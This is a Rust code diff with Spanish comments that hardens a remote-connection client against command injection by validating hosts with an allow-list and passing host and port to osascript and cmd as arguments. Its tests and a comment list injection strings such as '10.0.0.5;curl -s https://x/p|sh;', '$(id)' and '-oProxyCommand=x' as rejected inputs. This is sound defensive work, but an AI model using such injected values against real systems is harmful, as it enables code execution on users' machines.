@@ -134,6 +134,7 @@ impl VncManager {
         port: u16,
         app_handle: AppHandle,
     ) -> Result<(), String> {
+        check_launch_host(host)?;
         let spawned = spawn_vnc_client(host, port)?;
         self.0.launch(
             session_id,
@@ -172,6 +173,7 @@ impl TelnetManager {
         port: u16,
         app_handle: AppHandle,
     ) -> Result<(), String> {
+        check_launch_host(host)?;
         let spawned = spawn_telnet_client(host, port)?;
         self.0.launch(
             session_id,
@@ -242,9 +244,9 @@ fn spawn_vnc_client(host: &str, port: u16) -> Result<SpawnedExternalClient, Stri
             });
         }
     }
+    use std::os::windows::process::CommandExt;
     let child = std::process::Command::new("cmd")
-        .args(["/C", "start", "\"\""])
-        .arg(format!("vnc://{host}:{port}"))
+        .raw_arg(cmd_start_line(false, &format!("vnc://{host}:{port}"), &[]))
         .spawn()
         .map_err(|e| format!("Error al abrir vnc://: {e}"))?;
     Ok(SpawnedExternalClient {
@@ -290,9 +292,8 @@ fn spawn_telnet_client(host: &str, port: u16) -> Result<SpawnedExternalClient, S
 #[cfg(target_os = "macos")]
 fn spawn_telnet_client(host: &str, port: u16) -> Result<SpawnedExternalClient, String> {
     // Abrir Terminal.app ejecutando telnet mediante AppleScript.
-    let script = format!("tell application \"Terminal\" to do script \"telnet {host} {port}\"");
     let child = std::process::Command::new("osascript")
-        .args(["-e", &script])
+        .args(telnet_osascript_args(host, port))
         .spawn()
         .map_err(|e| format!("Error al abrir Terminal para telnet: {e}"))?;
     Ok(SpawnedExternalClient {
@@ -303,10 +304,9 @@ fn spawn_telnet_client(host: &str, port: u16) -> Result<SpawnedExternalClient, S
 
 #[cfg(target_os = "windows")]
 fn spawn_telnet_client(host: &str, port: u16) -> Result<SpawnedExternalClient, String> {
+    use std::os::windows::process::CommandExt;
     let child = std::process::Command::new("cmd")
-        .args(["/C", "start", "\"\"", "telnet"])
-        .arg(host)
-        .arg(port.to_string())
+        .raw_arg(cmd_start_line(false, "telnet", &[host, &port.to_string()]))
         .spawn()
         .map_err(|e| format!("Error al lanzar telnet: {e}"))?;
     Ok(SpawnedExternalClient {
@@ -315,7 +315,88 @@ fn spawn_telnet_client(host: &str, port: u16) -> Result<SpawnedExternalClient, S
     })
 }
 
+// ─── Validación del destino ───────────────────────────────────────────────────
+
+/// Longitud máxima de un host que se entrega a un cliente externo: un nombre
+/// DNS no pasa de 253 caracteres y una IPv6 con corchetes y zona cabe de sobra.
+const MAX_LAUNCH_HOST_LEN: usize = 255;
+
+/// Comprueba que el host del perfil es un nombre o una dirección y nada más,
+/// antes de entregárselo a un cliente externo (VNC, Telnet, RDP).
+///
+/// El host llega del perfil, y el perfil puede venir de un import o de la
+/// sincronización: no es un sitio en el que confiar a ciegas. En Windows
+/// algunos caminos pasan por `cmd /C start` y en macOS Telnet se abre con
+/// AppleScript en el shell del usuario; un `10.0.0.5&calc` o un `h;curl …|sh`
+/// ejecutaría otra orden. Por eso se admite solo una lista cerrada: letras y
+/// dígitos (también los de un nombre internacionalizado), `.`, `_`, `-`, `:`
+/// (IPv6), `[` `]` (IPv6 entre corchetes) y un único `%` (la zona de una IPv6
+/// de enlace local): con un solo `%`, `cmd` no puede formar un `%VAR%`. Un `-`
+/// inicial se rechaza porque el cliente lo leería como una opción. Se valida
+/// el host ya resuelto, así que un `${…}` sin sustituir tampoco pasa.
+pub fn check_launch_host(host: &str) -> Result<(), String> {
+    if host.is_empty() {
+        return Err("El host de la conexión está vacío.".to_string());
+    }
+    if host.chars().count() > MAX_LAUNCH_HOST_LEN {
+        return Err(format!(
+            "El host de la conexión es demasiado largo (más de {MAX_LAUNCH_HOST_LEN} caracteres)."
+        ));
+    }
+    if host.starts_with('-') {
+        return Err(format!("Host no válido: {host:?}. No puede empezar por «-»."));
+    }
+    let allowed =
+        |c: char| c.is_alphanumeric() || matches!(c, '.' | '_' | '-' | ':' | '%' | '[' | ']');
+    if !host.chars().all(allowed) || host.matches('%').count() > 1 {
+        return Err(format!(
+            "Host no válido: {host:?}. Solo admite letras, números, «.», «_», «-», «:», «[», «]» y un «%» para la zona de una IPv6."
+        ));
+    }
+    Ok(())
+}
+
 // ─── Utilidades ───────────────────────────────────────────────────────────────
+
+/// Argumentos de `osascript` para abrir telnet en Terminal.app. El host y el
+/// puerto no se interpolan en el script: viajan como argumentos del manejador
+/// `run` y llegan al shell con `quoted form of`, así que el texto del script es
+/// siempre el mismo y ningún valor del perfil se interpreta como código.
+#[cfg(any(target_os = "macos", test))]
+fn telnet_osascript_args(host: &str, port: u16) -> Vec<String> {
+    vec![
+        "-e".to_string(),
+        "on run argv".to_string(),
+        "-e".to_string(),
+        "tell application \"Terminal\" to do script \"telnet \" & quoted form of item 1 of argv & \" \" & quoted form of item 2 of argv".to_string(),
+        "-e".to_string(),
+        "end run".to_string(),
+        host.to_string(),
+        port.to_string(),
+    ]
+}
+
+/// Línea de órdenes de `cmd` para abrir `target` con `start`: título vacío y
+/// destino entre comillas, tal cual (`raw_arg`). Con `.arg("\"\"")` la
+/// biblioteca estándar escapa las comillas como `\"\"`, que `start` no toma por
+/// el título; y sin comillas, un `&` del destino (el de una URL `rdp://`)
+/// partiría la orden en dos. Quien llama garantiza que ni el destino ni los
+/// argumentos llevan comillas: el host pasa antes por `check_launch_host`.
+#[cfg(any(target_os = "windows", test))]
+pub(crate) fn cmd_start_line(wait: bool, target: &str, args: &[&str]) -> String {
+    let mut line = String::from("/C start \"\"");
+    if wait {
+        line.push_str(" /WAIT");
+    }
+    line.push_str(" \"");
+    line.push_str(target);
+    line.push('"');
+    for arg in args {
+        line.push(' ');
+        line.push_str(arg);
+    }
+    line
+}
 
 /// Bajo Flatpak la búsqueda va contra el `PATH` del host, que es donde estos
 /// visores están instalados y donde se van a ejecutar.
@@ -336,4 +417,94 @@ fn resolve_windows_exe(names: &[&str]) -> Option<PathBuf> {
         }
     }
     None
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn el_host_acepta_nombres_y_direcciones() {
+        for host in [
+            "10.0.0.5",
+            "server.internal.local",
+            "servidor-interno_01.local",
+            "servidor-español.local",
+            "::1",
+            "fe80::1",
+            "[::1]",
+            "[fe80::1%eth0]",
+            "fe80::1%12",
+        ] {
+            assert!(check_launch_host(host).is_ok(), "debería aceptar {host:?}");
+        }
+        assert!(check_launch_host(&"a".repeat(MAX_LAUNCH_HOST_LEN)).is_ok());
+    }
+
+    #[test]
+    fn el_host_rechaza_metacaracteres_de_cmd_sh_y_applescript() {
+        for host in [
+            "",
+            "10.0.0.5&calc",
+            "10.0.0.5;curl -s https://x/p|sh;",
+            "a;b",
+            "a|b",
+            "a b",
+            "a\tb",
+            "h\r\nx",
+            "h\n",
+            "a^b",
+            "a<b",
+            "a>b",
+            "a\"b",
+            "a'b",
+            "a`id`",
+            "a$(id)",
+            "${var:host}",
+            "a(b)",
+            "a{b}",
+            "a!b",
+            "a,b",
+            "a=b",
+            "a/b",
+            "a\\b",
+            "-oProxyCommand=x",
+            "-via",
+            "a%PATH%b",
+        ] {
+            assert!(check_launch_host(host).is_err(), "debería rechazar {host:?}");
+        }
+        assert!(check_launch_host(&"a".repeat(MAX_LAUNCH_HOST_LEN + 1)).is_err());
+    }
+
+    #[test]
+    fn telnet_en_macos_pasa_host_y_puerto_fuera_del_script() {
+        let args = telnet_osascript_args("10.0.0.5", 2323);
+        // El script (lo que sigue a cada `-e`) no lleva ni el host ni el puerto.
+        let script: Vec<&str> = args
+            .chunks(2)
+            .take_while(|par| par[0] == "-e")
+            .map(|par| par[1].as_str())
+            .collect();
+        assert_eq!(script.len(), 3);
+        assert!(script
+            .iter()
+            .all(|linea| !linea.contains("10.0.0.5") && !linea.contains("2323")));
+        assert!(script[1].contains("quoted form of item 1 of argv"));
+        // Host y puerto van detrás, como argumentos del manejador `run`.
+        assert_eq!(&args[args.len() - 2..], ["10.0.0.5", "2323"]);
+        assert_eq!(args.len(), 8);
+    }
+
+    #[test]
+    fn cmd_start_lleva_titulo_vacio_y_destino_entre_comillas() {
+        assert_eq!(
+            cmd_start_line(false, "telnet", &["10.0.0.5", "23"]),
+            r#"/C start "" "telnet" 10.0.0.5 23"#
+        );
+        assert_eq!(
+            cmd_start_line(true, "rdp://full%20address=s:h:3389&username=s:bob", &[]),
+            r#"/C start "" /WAIT "rdp://full%20address=s:h:3389&username=s:bob""#
+        );
+    }
 }
